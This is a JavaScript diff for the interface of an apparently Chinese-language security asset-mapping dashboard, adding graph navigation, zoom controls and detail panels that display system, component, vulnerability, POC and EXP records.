+    if (y+ttH>wrapRect.height-8) y=wrapRect.height-ttH-8;
+    tt.style.left=x+'px'; tt.style.top=y+'px';
+  }
+
+  function onNodeLeave(e) {
+    const shape=e.currentTarget.querySelector('.node-shape');
+    if (shape) {
+      const keep = e.currentTarget.classList.contains('selected-node');
+      shape.setAttribute('stroke-width', keep ? '2.6' : '1.5');
+      shape.style.filter = '';
+    }
+    document.getElementById('nodeTooltip').classList.remove('show');
+  }
+
+  function onNodeClick(node) {
+    clearActiveNodeEffects();
+    activeNodeId = node.id;
+    applyActiveNodeEffects(node);
+    showNodeDetail(node);
+    const children=getDrillChildren(node.id);
+    if (children.length>0 && node.id!==currentRoot) drillTo(node.id);
+  }
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] DRILL & BREADCRUMB
+   * =========================================================== */
+  function drillTo(nodeId) {
+    if (nodeId===null) { drillPath=[]; }
+    else {
+      const node=GRAPH_DATA.nodes[nodeId];
+      const idx=drillPath.findIndex(p=>p.id===nodeId);
+      if (idx>=0) drillPath=drillPath.slice(0,idx+1);
+      else drillPath.push({id:nodeId, label:node?node.label:nodeId});
+    }
+    updateBreadcrumb();
+    zoom=1; panX=0; panY=0; applyTransform();
+    activeNodeId = nodeId;
+    renderGraph(nodeId);
+    clearActiveNodeEffects();
+    if (nodeId) {
+      const node = GRAPH_DATA.nodes[nodeId];
+      if (node) {
+        applyActiveNodeEffects(node);
+        showNodeDetail(node);
+      }
+    } else {
+      closeDetail();
+    }
+    triggerFocusGlow();
+  }
+
+  function updateBreadcrumb() {
+    let html='<i class="ri-mind-map" style="font-size:13px;color:var(--text-tertiary);"></i>';
+    html+='<a onclick="drillTo(null)" style="cursor:pointer;">资产图谱</a>';
+    drillPath.forEach((p,i) => {
+      html+='<span class="sep">/</span>';
+      if (i===drillPath.length-1) html+=`<span class="current">${p.label}</span>`;
+      else html+=`<a onclick="drillTo('${p.id}')" style="cursor:pointer;">${p.label}</a>`;
+    });
+    document.getElementById('graphBreadcrumb').innerHTML=html;
+  }
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] ZOOM / PAN
+   * =========================================================== */
+  function changeZoom(factor) {
+    zoom=Math.max(0.3,Math.min(3,zoom*factor));
+    applyTransform();
+  }
+  function resetView() { zoom=1; panX=0; panY=0; applyTransform(); }
+  function applyTransform() {
+    const t=`translate(${svgW/2*(1-zoom)+panX*zoom},${svgH/2*(1-zoom)+panY*zoom}) scale(${zoom})`;
+    ['nodesLayer','edgesLayer'].forEach(id=>{ const g=document.getElementById(id); if(g) g.setAttribute('transform',t); });
+    document.getElementById('zoomIndicator').textContent=Math.round(zoom*100)+'%';
+  }
+
+  function toggleSysInfoExpand(btn) {
+    const kvContainer = btn.previousElementSibling;
+    if (!kvContainer) return;
+    const isExpanded = btn.dataset.expanded === 'true';
+    if (isExpanded) {
+      kvContainer.querySelectorAll('.detail-kv-item.hidden-row').forEach(el => el.style.display = 'none');
+      btn.innerHTML = '展开全部 <i class="ri-arrow-down-s-line"></i>';
+      btn.dataset.expanded = 'false';
+    } else {
+      kvContainer.querySelectorAll('.detail-kv-item.hidden-row').forEach(el => el.style.display = 'flex');
+      btn.innerHTML = '收起 <i class="ri-arrow-up-s-line"></i>';
+      btn.dataset.expanded = 'true';
+    }
+  }
+
+  function renderContainerIpPopoverHtml(node) {
+    if (!node.imgTags || node.imgTags.length <= 1) return '';
+    return `<div class="ip-popover" id="imgTagPopover-${node.id}">
+      ${node.imgTags.slice(1).map(tag => `<div class="ip-popover-item"><span class="mono">${tag}</span></div>`).join('')}
+    </div>`;
+  }
+  
+  function toggleImgTagList(id) {
+    const pop = document.getElementById('imgTagPopover-'+id);
+    if(pop) pop.classList.toggle('show');
+  }
+
+  function renderLicensePopoverHtml(node) {
+    if (!node.licenses || node.licenses.length <= 1) return '';
+    return `<div class="ip-popover" id="licensePopover-${node.id}">
+      ${node.licenses.slice(1).map(l => `<div class="ip-popover-item"><span class="mono">${l}</span></div>`).join('')}
+    </div>`;
+  }
+  
+  function toggleLicenseList(id) {
+    const pop = document.getElementById('licensePopover-'+id);
+    if(pop) pop.classList.toggle('show');
+  }
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] DETAIL PANEL
+   * =========================================================== */
+  function showNodeDetail(node) {
+    document.getElementById('detailEmpty').style.display='none';
+    document.getElementById('detailContent').style.display='block';
+    let html='';
+    if (node.type==='system') {
+      const kvItems = [
+        `<div class="detail-kv-item"><span class="kv-label">系统名称</span><span class="kv-value" style="font-weight:600;">${node.label}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">风险等级</span><span class="kv-value"><span class="badge ${riskBadge(node.risk)}">${node.riskLabel}</span></span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">关联主机名</span><span class="kv-value mono">${node.hostname||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">关联主机IP</span><span class="kv-value"><div style="position:relative;display:inline-block;min-width:180px;">
+            ${renderPrimaryIpHtml(node)}
+            ${renderIpPopoverHtml(node)}
+          </div></span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">操作系统</span><span class="kv-value">${node.os||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">系统版本</span><span class="kv-value mono">${node.osVersion||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">CPU架构</span><span class="kv-value mono">${node.cpuArch||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">发行版</span><span class="kv-value">${node.distro||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">发行版版本</span><span class="kv-value mono">${node.distroVersion||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">内核版本</span><span class="kv-value mono">${node.kernelVersion||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">虚拟化系统</span><span class="kv-value">${node.virtSys||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">虚拟化角色</span><span class="kv-value">${node.virtRole||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">运行时长</span><span class="kv-value mono">${node.uptime||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">进程数</span><span class="kv-value mono">${node.processCount!=null?node.processCount:'-'}</span></div>`
+      ];
+      
+      const MAX_ROWS = 8;
+      const visibleItems = kvItems.slice(0, MAX_ROWS).join('');
+      const hiddenItems = kvItems.slice(MAX_ROWS).map(item => item.replace('class="detail-kv-item"', 'class="detail-kv-item hidden-row" style="display:none;"')).join('');
+      
+      html=`<div class="detail-section"><div class="detail-section-title"><i class="ri-information-line"></i> 系统基本信息</div>
+        <div class="detail-kv">
+          ${visibleItems}
+          ${hiddenItems}
+        </div>
+        ${kvItems.length > MAX_ROWS ? `<div class="kv-expand-btn" data-expanded="false" onclick="toggleSysInfoExpand(this)">展开全部 <i class="ri-arrow-down-s-line"></i></div>` : ''}
+        </div>
+        <div class="detail-section"><div class="detail-section-title"><i class="ri-bar-chart-box-line"></i> 统计概览</div>
+        <div class="detail-metrics">
+          <div class="detail-metric"><div class="dm-val accent">${countScopeAssets(node.id,'system')}</div><div class="dm-label">纳管资产</div></div>
+          <div class="detail-metric"><div class="dm-val">${countScopeComponents(node.id,'system')}</div><div class="dm-label">组件总数</div></div>
+          <div class="detail-metric"><div class="dm-val danger">${countScopeVulns(node.id,'system')}</div><div class="dm-label">漏洞总数</div></div>
+        </div></div>
+        ${renderScopeTabs(node, [
+          { id:'assets', label:'纳管资产', html: renderManagedAssetsTab(node.id,'system') },
+          { id:'components', label:'组件列表', html: renderScopeComponentsTab(node.id) },
+          { id:'risks', label:'风险列表', html: renderScopeRisksTab(node.id) }
+        ])}`;
+    } else if (node.type==='app') {
+      const parentAsset = node.container ? (GRAPH_DATA.nodes[node.container]?.label || node.container) : (node.system ? (GRAPH_DATA.nodes[node.system]?.label || node.system) : '-');
+      const kvItems = [
+        `<div class="detail-kv-item"><span class="kv-label">资产名称</span><span class="kv-value" style="font-weight:600;">${node.label}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">风险等级</span><span class="kv-value"><span class="badge ${riskBadge(node.risk)}">${node.riskLabel}</span></span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">所属资产</span><span class="kv-value">${parentAsset}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">应用路径</span><span class="kv-value mono">${node.appPath||'-'}</span></div>`
+      ].filter(Boolean);
+      
+      const MAX_ROWS = 8;
+      const visibleItems = kvItems.slice(0, MAX_ROWS).join('');
+      const hiddenItems = kvItems.slice(MAX_ROWS).map(item => item.replace('class="detail-kv-item"', 'class="detail-kv-item hidden-row" style="display:none;"')).join('');
+      
+      html=`<div class="detail-section"><div class="detail-section-title"><i class="ri-information-line"></i> 应用基本信息</div>
+        <div class="detail-kv">
+          ${visibleItems}
+          ${hiddenItems}
+        </div>
+        ${kvItems.length > MAX_ROWS ? `<div class="kv-expand-btn" data-expanded="false" onclick="toggleSysInfoExpand(this)">展开全部 <i class="ri-arrow-down-s-line"></i></div>` : ''}
+        </div>
+        <div class="detail-section"><div class="detail-section-title"><i class="ri-bar-chart-box-line"></i> 统计概览</div>
+          <div class="detail-metrics" style="grid-template-columns:1fr 1fr 1fr;">
+            <div class="detail-metric"><div class="dm-val accent">${countScopeAssets(node.id,'app')}</div><div class="dm-label">关联资产</div></div>
+            <div class="detail-metric"><div class="dm-val">${countScopeComponents(node.id,'app')}</div><div class="dm-label">组件总数</div></div>
+            <div class="detail-metric"><div class="dm-val danger">${countScopeVulns(node.id,'app')}</div><div class="dm-label">漏洞总数</div></div>
+          </div>
+        </div>
+        ${renderScopeTabs(node, [
+          { id:'assets', label:'关联资产', html: renderAssociatedAssetsTab(node.id) },
+          { id:'components', label:'组件列表', html: renderScopeComponentsTab(node.id) },
+          { id:'risks', label:'风险信息', html: renderScopeRisksTab(node.id) }
+        ])}`;
+    } else if (node.type==='container') {
+      const kvItems = [
+        `<div class="detail-kv-item"><span class="kv-label">容器名称</span><span class="kv-value" style="font-weight:600;">${node.label}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">风险等级</span><span class="kv-value"><span class="badge ${riskBadge(node.risk)}">${node.riskLabel}</span></span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">所属资产</span><span class="kv-value">${node.system?GRAPH_DATA.nodes[node.system]?.label||node.system:'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">镜像标签</span><span class="kv-value"><div style="position:relative;display:inline-block;">
+            <div class="ip-kv"><span class="kv-value mono">${node.imgTag||'-'}</span>${node.imgTags&&node.imgTags.length>1?`<button class="ip-more-btn" onclick="toggleImgTagList('${node.id}')">…</button>`:''}</div>
+            ${renderContainerIpPopoverHtml(node)}
+          </div></span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">镜像大小</span><span class="kv-value mono">${node.imgSize||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">创建时间</span><span class="kv-value mono">${node.created||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">操作系统</span><span class="kv-value">${node.os||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">架构</span><span class="kv-value mono">${node.cpuArch||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">发行版</span><span class="kv-value">${node.distro||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">发行版版本</span><span class="kv-value mono">${node.distroVersion||'-'}</span></div>`
+      ];
+      
+      const MAX_ROWS = 8;
+      const visibleItems = kvItems.slice(0, MAX_ROWS).join('');
+      const hiddenItems = kvItems.slice(MAX_ROWS).map(item => item.replace('class="detail-kv-item"', 'class="detail-kv-item hidden-row" style="display:none;"')).join('');
+      
+      html=`<div class="detail-section"><div class="detail-section-title"><i class="ri-information-line"></i> 容器基本信息</div>
+        <div class="detail-kv">
+          ${visibleItems}
+          ${hiddenItems}
+        </div>
+        ${kvItems.length > MAX_ROWS ? `<div class="kv-expand-btn" data-expanded="false" onclick="toggleSysInfoExpand(this)">展开全部 <i class="ri-arrow-down-s-line"></i></div>` : ''}
+        </div>
+        <div class="detail-section"><div class="detail-section-title"><i class="ri-bar-chart-box-line"></i> 统计概览</div>
+          <div class="detail-metrics">
+            <div class="detail-metric"><div class="dm-val accent">${countScopeAssets(node.id,'container')}</div><div class="dm-label">纳管资产</div></div>
+            <div class="detail-metric"><div class="dm-val">${countScopeComponents(node.id,'container')}</div><div class="dm-label">组件总数</div></div>
+            <div class="detail-metric"><div class="dm-val danger">${countScopeVulns(node.id,'container')}</div><div class="dm-label">漏洞总数</div></div>
+          </div>
+        </div>
+        ${renderScopeTabs(node, [
+          { id:'assets', label:'纳管资产', html: renderManagedAssetsTab(node.id,'container') },
+          { id:'components', label:'组件列表', html: renderScopeComponentsTab(node.id,'container') },
+          { id:'risks', label:'风险列表', html: renderScopeRisksTab(node.id,'container') }
+        ])}`;
+    } else if (node.type==='model') {
+      const app = getAncestorByType(node.id,'app');
+      const parentAsset = app ? (GRAPH_DATA.nodes[app]?.label || app) : 'llm-service';
+      const kvItems = [
+        `<div class="detail-kv-item"><span class="kv-label">模型名称</span><span class="kv-value" style="font-weight:600;">${node.label||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">风险等级</span><span class="kv-value"><span class="badge ${riskBadge(node.risk)}">${node.riskLabel||'-'}</span></span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">所属资产</span><span class="kv-value">${parentAsset}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">模型路径</span><span class="kv-value mono">${node.modelPath||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">模型格式</span><span class="kv-value">${node.sublabel||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">模型大小</span><span class="kv-value">${node.modelSize||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">模型类型</span><span class="kv-value">${node.modelType||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">模型架构</span><span class="kv-value">${node.modelArch||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">参数量</span><span class="kv-value">${node.params||'-'}</span></div>`
+      ];
+
+      const MAX_ROWS = 8;
+      const visibleItems = kvItems.slice(0, MAX_ROWS).join('');
+      const hiddenItems = kvItems.slice(MAX_ROWS).map(item => item.replace('class="detail-kv-item"', 'class="detail-kv-item hidden-row" style="display:none;"')).join('');
+
+      html=`<div class="detail-section"><div class="detail-section-title"><i class="ri-information-line"></i> 模型基本信息</div>
+        <div class="detail-kv">
+          ${visibleItems}
+          ${hiddenItems}
+        </div>
+        ${kvItems.length > MAX_ROWS ? `<div class="kv-expand-btn" data-expanded="false" onclick="toggleSysInfoExpand(this)">展开全部 <i class="ri-arrow-down-s-line"></i></div>` : ''}
+        </div>
+        <div class="detail-section"><div class="detail-section-title"><i class="ri-bar-chart-box-line"></i> 统计概览</div>
+          <div class="detail-metrics" style="grid-template-columns:1fr 1fr;">
+            <div class="detail-metric"><div class="dm-val accent">${countScopeComponents(node.id,'model')}</div><div class="dm-label">组件总数</div></div>
+            <div class="detail-metric"><div class="dm-val danger">${countScopeVulns(node.id,'model')}</div><div class="dm-label">漏洞总数</div></div>
+          </div>
+        </div>
+        ${renderScopeTabs(node, [
+          { id:'components', label:'组件列表', html: renderScopeComponentsTab(node.id,'model') },
+          { id:'risks', label:'风险信息', html: renderScopeRisksTab(node.id,'model') }
+        ])}`;
+    } else if (node.type==='component') {
+      const sys = getAncestorByType(node.id,'system');
+      const app = getAncestorByType(node.id,'app');
+      
+      const kvItems = [
+        `<div class="detail-kv-item"><span class="kv-label">组件名称</span><span class="kv-value" style="font-weight:600;display:flex;align-items:center;gap:6px;">${node.label||'-'}${node.isAI ? '<span class="ai-tag" style="margin-left:4px;">AI</span>' : ''}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">风险等级</span><span class="kv-value"><span class="badge ${riskBadge(node.risk)}">${node.riskLabel||'-'}</span></span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">漏洞总数</span><span class="kv-value" style="color:var(--danger);font-weight:600;">${countCompVulns(node.id)}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">组件类型</span><span class="kv-value">${node.ctype||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">组件版本</span><span class="kv-value mono">${node.sublabel||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">编程语言</span><span class="kv-value">${node.language||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">组件厂商</span><span class="kv-value">${node.vendor||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">Package URL</span><span class="kv-value mono">${node.purl||'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">参考链接</span><span class="kv-value">${node.ref?`<a href="${node.ref}" target="_blank" style="color:var(--accent);word-break:break-all;">${node.ref}</a>`:'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">组件首页</span><span class="kv-value">${node.homepage?`<a href="${node.homepage}" target="_blank" style="color:var(--accent);word-break:break-all;">${node.homepage}</a>`:'-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">许可证</span><span class="kv-value"><div style="position:relative;display:inline-block;max-width:100%;">
+          <div class="ip-kv"><span class="kv-value mono">${node.license||'-'}</span>${node.licenses&&node.licenses.length>1?`<button class="ip-more-btn" onclick="toggleLicenseList('${node.id}')">…</button>`:''}</div>
+          ${renderLicensePopoverHtml(node)}
+        </div></span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">组件描述</span><span class="kv-value">${node.desc||'-'}</span></div>`
+      ];
+      
+      const MAX_ROWS = 8;
+      const visibleItems = kvItems.slice(0, MAX_ROWS).join('');
+      const hiddenItems = kvItems.slice(MAX_ROWS).map(item => item.replace('class="detail-kv-item"', 'class="detail-kv-item hidden-row" style="display:none;"')).join('');
+      
+      html=`<div class="detail-section"><div class="detail-section-title"><i class="ri-information-line"></i> 组件基本信息</div>
+        <div class="detail-kv">
+          ${visibleItems}
+          ${hiddenItems}
+        </div>
+        ${kvItems.length > MAX_ROWS ? `<div class="kv-expand-btn" data-expanded="false" onclick="toggleSysInfoExpand(this)">展开全部 <i class="ri-arrow-down-s-line"></i></div>` : ''}
+        </div>
+        ${renderScopeTabs(node, [
+          { id:'risks', label:'风险信息', html: renderComponentRiskTab(node.id) },
+          { id:'assets', label:'关联资产', html: renderComponentAssocAssetsTab(node.id) }
+        ])}`;
+    } else if (node.type==='vuln') {
+      const cvssScore = (() => {
+        if (node.cvss != null && node.cvss !== '') {
+          const v = Number(node.cvss);
+          if (!Number.isNaN(v)) return v;
+        }
+        const sub = String(node.sublabel || '').trim();
+        const m = sub.match(/(\d+(?:\.\d+)?)/);
+        return m ? Number(m[1]) : null;
+      })();
+      const cweText = (() => {
+        if (Array.isArray(node.cwe)) return node.cwe.map(x => String(x).trim()).filter(Boolean).join(',');
+        const raw = String(node.cwe ?? '').trim();
+        if (!raw) return '-';
+        if (raw.includes(',')) return raw.split(',').map(x => String(x).trim()).filter(Boolean).join(',');
+        return raw;
+      })();
+      const cvssClass = (['critical','high','medium','low'].includes(node.risk) ? node.risk : '');
+      const linkUrl = node.link || (node.label ? `https://nvd.nist.gov/vuln/detail/${encodeURIComponent(node.label)}` : '');
+      const linkHtml = linkUrl ? `<a href="${linkUrl}" target="_blank" style="color:var(--accent);word-break:break-all;">${escapeHtml(linkUrl)}</a>` : '-';
+
+      const kvItems = [
+        `<div class="detail-kv-item"><span class="kv-label">漏洞编号</span><span class="kv-value mono with-copy"><span id="kv-${node.id}-vuln">${escapeHtml(String(node.label || '-'))}</span><button class="kv-copy-btn" onclick="copyCodeFrom('kv-${node.id}-vuln', this)" title="复制"><i class="ri-file-copy-line"></i></button></span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">漏洞等级</span><span class="kv-value"><span class="badge ${riskBadge(node.risk)}">${escapeHtml(String(node.riskLabel || '-'))}</span></span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">漏洞名称</span><span class="kv-value" style="font-weight:600;">${node.name || '-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">CNVD 编号</span><span class="kv-value mono">${escapeHtml(String(node.cnvd || '-'))}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">CNNVD 编号</span><span class="kv-value mono">${escapeHtml(String(node.cnnvd || '-'))}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">漏洞发布时间</span><span class="kv-value mono">${escapeHtml(String(node.publishDate || '-'))}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">CVSS 评分</span><span class="kv-value mono">${cvssScore == null ? '-' : `<span class="cvss-score ${cvssClass}">${cvssScore.toFixed(1)}</span>`}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">CVSS 向量</span><span class="kv-value mono">${escapeHtml(String(node.vector || '-'))}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">风险分数</span><span class="kv-value mono">${node.riskScore != null ? escapeHtml(String(node.riskScore)) : '-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">EPSS 评分</span><span class="kv-value mono">${node.epss != null ? Number(node.epss).toFixed(3) : '-'}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">CWE 编号</span><span class="kv-value mono">${escapeHtml(String(cweText || '-'))}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">漏洞危害</span><span class="kv-value">${escapeHtml(String(node.harm || '-'))}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">查看链接</span><span class="kv-value">${linkHtml}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">解决方案</span><span class="kv-value">${escapeHtml(String(node.solution || '-'))}</span></div>`,
+        `<div class="detail-kv-item"><span class="kv-label">漏洞详情</span><span class="kv-value" style="line-height:1.8;">${escapeHtml(String(node.detail || '-'))}</span></div>`
+      ];
+
+      const MAX_ROWS = 8;
+      const visibleItems = kvItems.slice(0, MAX_ROWS).join('');
+      const hiddenItems = kvItems.slice(MAX_ROWS).map(item => item.replace('class="detail-kv-item"', 'class="detail-kv-item hidden-row" style="display:none;"')).join('');
+
+      html=`<div class="detail-section">
+        <div class="detail-kv">
+          ${visibleItems}
+          ${hiddenItems}
+        </div>
+        ${kvItems.length > MAX_ROWS ? `<div class="kv-expand-btn" data-expanded="false" onclick="toggleSysInfoExpand(this)">展开全部 <i class="ri-arrow-down-s-line"></i></div>` : ''}
+      </div>
+      ${renderScopeTabs(node, [
+        { id:'impact-assets', label:'影响资产', html: renderVulnAffectedAssetsTab(node.id) },
+        { id:'impact-components', label:'影响组件', html: renderVulnAffectedComponentsTab(node.id) }
+      ])}`;
+    } else if (node.type==='poc') {
+      const refUrl = node.ref || '-';
+      const refHtml = refUrl === '-' ? '-' : `<a href="${refUrl}" target="_blank" style="color:var(--accent);word-break:break-all;">${escapeHtml(String(refUrl))}</a>`;
+      html=`<div class="detail-section"><div class="detail-section-title"><i class="ri-file-code-line"></i> POC 信息</div>
+        <div class="detail-kv">
+          <div class="detail-kv-item"><span class="kv-label">POC 编号</span><span class="kv-value mono with-copy" style="font-weight:600;"><span id="kv-${node.id}-poc">${escapeHtml(node.label||'-')}</span><button class="kv-copy-btn" onclick="copyCodeFrom('kv-${node.id}-poc', this)" title="复制"><i class="ri-file-copy-line"></i></button></span></div>
+          <div class="detail-kv-item"><span class="kv-label">POC 名称</span><span class="kv-value" style="font-weight:600;">${node.name||'-'}</span></div>
+          <div class="detail-kv-item"><span class="kv-label">执行引擎</span><span class="kv-value">${escapeHtml(String(node.engine||'-'))}</span></div>
+          <div class="detail-kv-item"><span class="kv-label">编程语言</span><span class="kv-value">${escapeHtml(String(node.language||'-'))}</span></div>
+          <div class="detail-kv-item"><span class="kv-label">参考链接</span><span class="kv-value">${refHtml}</span></div>
+        </div></div>
+        <div class="detail-section"><div class="detail-section-title"><i class="ri-code-s-slash-line"></i> POC 内容</div>
+          <div class="code-block-wrap">
+            <pre class="code-block" id="code-${node.id}">${escapeHtml(node.content||'')}</pre>
+          </div>
+        </div>`;
+    } else if (node.type==='exp') {
+      const refUrl = node.ref || node.link || '-';
+      const refHtml = refUrl === '-' ? '-' : `<a href="${refUrl}" target="_blank" style="color:var(--accent);word-break:break-all;">${escapeHtml(String(refUrl))}</a>`;
+      html=`<div class="detail-section"><div class="detail-section-title"><i class="ri-rocket-line"></i> EXP 信息</div>
+        <div class="detail-kv">
+          <div class="detail-kv-item"><span class="kv-label">EXP 编号</span><span class="kv-value mono with-copy" style="font-weight:600;"><span id="kv-${node.id}-exp">${escapeHtml(node.label||'-')}</span><button class="kv-copy-btn" onclick="copyCodeFrom('kv-${node.id}-exp', this)" title="复制"><i class="ri-file-copy-line"></i></button></span></div>
+          <div class="detail-kv-item"><span class="kv-label">EXP 名称</span><span class="kv-value" style="font-weight:600;">${node.name||'-'}</span></div>
+          <div class="detail-kv-item"><span class="kv-label">执行引擎</span><span class="kv-value">${escapeHtml(String(node.engine||'-'))}</span></div>
+          <div class="detail-kv-item"><span class="kv-label">编程语言</span><span class="kv-value">${escapeHtml(String(node.language||'-'))}</span></div>
+          <div class="detail-kv-item"><span class="kv-label">参考链接</span><span class="kv-value">${refHtml}</span></div>
+        </div></div>
+        <div class="detail-section"><div class="detail-section-title"><i class="ri-code-s-slash-line"></i> EXP 内容</div>
+          <div class="code-block-wrap">
+            <pre class="code-block" id="code-${node.id}">${escapeHtml(node.content||'')}</pre>
+          </div>
+        </div>`;
+    }
+    document.getElementById('detailContent').innerHTML=html;
+    enhancePreCopyButtons(document.getElementById('detailContent'));
+    document.getElementById('detailPanelTitle').textContent=
+      {system:'系统详情',app:'应用详情',container:'容器详情',model:'模型详情',component:'组件详情',vuln:'漏洞详情',poc:'POC 详情',exp:'EXP 详情'}[node.type]||'资产详情';
+    hideAllIpPopovers();
+    setDefaultActiveTab(node.id);
+  }
+
+  function renderChildList(nodeId) {
+    const children=getDrillChildren(nodeId);
+    if (!children.length) return '<p style="font-size:12px;color:var(--text-tertiary);padding:4px 0;">无子节点</p>';
+    const tc={system:'#2563eb',app:'#059669',container:'#7c3aed',model:'#d97706',component:'#0891b2',vuln:'#dc2626',poc:'#0ea5e9',exp:'#ef4444'};
+    return children.map(id => {
+      const n=GRAPH_DATA.nodes[id]; if (!n) return '';
+      return `<div class="assoc-item" onclick="onNodeClick(GRAPH_DATA.nodes['${id}'])">
+        <div class="assoc-icon" style="background:${tc[n.type]||'#94a3b8'}22;color:${tc[n.type]||'#94a3b8'};border:1px solid ${tc[n.type]||'#94a3b8'}44;border-radius:50%;"><i class="ri-${typeIcon(n.type)}-line"></i></div>
+        <div class="assoc-info"><div class="assoc-name">${n.label}</div><div class="assoc-type">${typeLabel(n.type)} · ${n.sublabel||''}</div></div>
+        ${n.riskLabel?`<span class="badge ${riskBadge(n.risk)}" style="font-size:10px;">${n.riskLabel}</span>`:''}
+      </div>`;
+    }).join('');
+  }
+
+  function renderVulnList(compId) {
+    const edges=GRAPH_DATA.edges.filter(e=>e.from===compId&&GRAPH_DATA.nodes[e.to]?.type==='vuln');
+    if (!edges.length) return '<p style="font-size:12px;color:var(--text-tertiary);padding:10px 16px;">暂无关联漏洞</p>';
+    return edges.map(e => {
+      const v=GRAPH_DATA.nodes[e.to]; if(!v) return '';
+      return `<div class="vuln-list-item"><div class="vuln-title"><span class="badge ${riskBadge(v.risk)}">${v.riskLabel}</span> ${v.label}</div><div class="vuln-meta"><span>${v.sublabel}</span></div></div>`;
+    }).join('');
+  }
+
+  function closeDetail() {
+    document.getElementById('detailEmpty').style.display='flex';
+    document.getElementById('detailContent').style.display='none';
+    document.getElementById('detailContent').innerHTML='';
+    document.getElementById('detailPanelTitle').textContent='资产详情';
+    hideAllIpPopovers();
+    activeNodeId = null;
+    clearActiveNodeEffects();
+  }
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] HELPERS
+   * =========================================================== */
+  function typeIcon(t) { return {system:'server',app:'apps',container:'instance',model:'brain',component:'code-box',vuln:'bug',poc:'file-code',exp:'rocket'}[t]||'circle'; }
+  function typeLabel(t) { return {system:'系统',app:'应用',container:'容器',model:'模型',component:'组件',vuln:'漏洞',poc:'POC',exp:'EXP'}[t]||t; }
+  function riskBadge(r) { return {critical:'badge-critical',high:'badge-high',medium:'badge-medium',low:'badge-low',none:''}[r]||''; }
+  function riskColor(r) { return {critical:'#b91c1c',high:'#c2410c',medium:'#d97706',low:'#059669',none:'#94a3b8'}[r]||'#94a3b8'; }
+
+  function isAssetType(t) { return ['system','app','container','model'].includes(t); }
+
+  function getAncestorByType(nodeId, type) {
+    let cur = nodeId;
+    for (let i=0;i<6;i++) {
+      const p = findParent(cur);
+      if (!p) break;
+      const tn = GRAPH_DATA.nodes[p];
+      if (tn?.type === type) return p;
+      cur = p;
+    }
+    return null;
+  }
+
+  function getNodeIps(node) {
+    const ips = Array.isArray(node?.ips) ? node.ips : [];
+    if (ips.length) return ips;
+    if (node?.ip) return [{ ip: node.ip, net: node.net, primary: true }];
+    return [];
+  }
+
+  function getPrimaryIpEntry(node) {
+    const ips = getNodeIps(node);
+    return ips.find(x => x.primary) || ips[0] || null;
+  }
+
+  function renderPrimaryIpHtml(node) {
+    const pe = getPrimaryIpEntry(node);
+    if (!pe?.ip) return `<div class="ip-kv"><span class="kv-value mono">-</span></div>`;
+    const netTag = pe.net ? `<span class="net-tag ${pe.net==='内网'?'internal':'external'}">${pe.net}</span>` : '';
+    const primaryTag = `<span class="badge badge-primary" style="font-size:10px;">主</span>`;
